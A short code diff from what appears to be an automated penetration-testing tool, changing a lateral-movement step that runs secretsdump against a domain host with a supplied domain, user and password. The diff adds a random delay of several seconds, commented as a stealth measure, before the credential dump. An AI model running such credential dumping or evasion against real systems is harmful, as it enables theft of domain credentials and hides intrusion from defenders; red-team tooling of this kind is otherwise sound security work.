@@ -180,8 +180,10 @@ def run_internal_lateral(executor, target: str, depth: str = "standard",
                 "phase": "internal_lateral",
             })
 
-    # 7. Secretsdump（域控/高权限）
+    # 7. Secretsdump（域控/高权限）— stealth 低调
     if profile.get("secret_dump") and user and password and domain:
+        import random as _rnd2, time as _time2
+        _time2.sleep(_rnd2.uniform(3.0, 8.0))
         r = _run_step("secret_dump", "secretsdump",
                       {"target": f"{domain}/{user}:{password}@{host}", "additional_args": ""})
         out = r.get("output", "")
